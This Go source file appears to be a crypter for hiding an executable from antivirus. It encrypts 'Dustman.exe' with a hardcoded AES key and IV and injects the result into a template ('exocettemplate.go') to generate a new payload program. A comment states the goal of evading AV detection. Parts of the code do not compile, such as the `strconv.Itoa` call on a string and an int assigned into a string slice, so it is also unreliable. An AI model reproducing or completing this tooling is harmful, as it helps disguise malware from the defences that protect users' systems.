package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}
func byteToString(data []byte) string {
	return string(data[:])
}

// func intToString(data []int) string {
// 	return string(data[:])
// }

// func intToString(text string) {
// 	return
// }
func encrypt(key []byte, iv []byte, text string) string {
	plaintext := []byte(text)
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
	return base64.URLEncoding.EncodeToString(ciphertext)
}
func decrypt(key []byte, iv []byte, payloadEncrypted string) string {
	ciphertext, _ := base64.URLEncoding.DecodeString(payloadEncrypted)
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	if len(ciphertext) < aes.BlockSize {
		panic("ciphertext too short")
	}
	ciphertext = ciphertext[aes.BlockSize:]
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)
	return fmt.Sprintf("%s", ciphertext)
}
func writePayload(key []byte, iv []byte, bPayloadEncrypted []byte) {
	k := byteToString(key)
	i := byteToString(iv)
	f, err := os.Create("key.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	f.WriteString(k)
	f.Close()
	g, err := os.Create("iv.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	g.WriteString(i)
	g.Close()
	ioutil.WriteFile("bPayloadEncrypted.txt", bPayloadEncrypted, 0644)
}

// func readTemplate(templateFile []string, key []byte, iv []byte, payloadEncrypted []byte) {
// 	input, err := ioutil.ReadFile(templateFile)
// 	if err != nil {
// 		log.Fatalln(err)
// 	}
// 	lines := strings.Split(string(input), "\n")
// 	for i, line := range lines {
// 		if strings.Contains(line, "{key}") {
// 			lines[i] = key
// 		}
// 		if strings.Contains(line, "{iv}") {
// 			lines[i] = iv
// 		}
// 		if strings.Contains(line, "{payload}") {
// 			lines[i] = payloadEncrypted
// 		}
// 	}
// 	fmt.Printf(lines)
// }
func main() {
	dat, err := ioutil.ReadFile("Dustman.exe")
	check(err)
	b64dat := base64.StdEncoding.EncodeToString(dat)
	fmt.Println(string(b64dat))
	fmt.Println("\r\nbase64 encoded version. This will still trigger AV, need to shuffle\r\n")
	key := []byte("rczmvkpoypddqyyswfjwxfoxzmrlqmxm")
	iv := []byte("opjdrgfuazfwkhah")
	payloadEncrypted := encrypt(key, iv, b64dat)
	bPayloadEncrypted := []byte(payloadEncrypted)
	fmt.Printf(payloadEncrypted)
	payloadDecrypted := decrypt(key, iv, payloadEncrypted)
	decodedPayload, _ := base64.StdEncoding.DecodeString(payloadDecrypted)
	ioutil.WriteFile("./testdustman.exe", decodedPayload, 0777)
	check(err)
	writePayload(key, iv, bPayloadEncrypted)
	// readTemplate("exocettemplate.go", key, iv, payloadEncrypted)
	// read the template file to rewrite the template payload
	input, err := ioutil.ReadFile("exocettemplate.go")
	if err != nil {
		log.Fatal(err)
	}
	// now it fucking works
	// 	// fmt.Printf("File contents: %", content)
	// 	./project.go:26:15: cannot convert data[:] (type []int) to type string
	// ./project.go:128:13: cannot use i (type int) as type string in assignment

	// Okay, so we can just modify the crypt and decrypt parameters to use a string as key and IV instead

	lines := strings.Split(string(input), "\n")

	// This is some buggy shit code
	k := byteToString(key)
	i := strconv.Itoa(byteToString(iv))
	// pl := byteToString(payloadEncrypted)
	for i, line := range lines {
		if strings.Contains(line, "{key}") {
			lines[i] = k
		}
		if strings.Contains(line, "{iv}") {
			lines[i] = i
		}
		if strings.Contains(line, "{payload") {
			lines[i] = payloadEncrypted
		}
	}
	output := strings.Join(lines, "\n")
	err = ioutil.WriteFile("GeneratedPayload.go", []byte(output), 0644)
	if err != nil {
		log.Fatalln(err)
	}
}
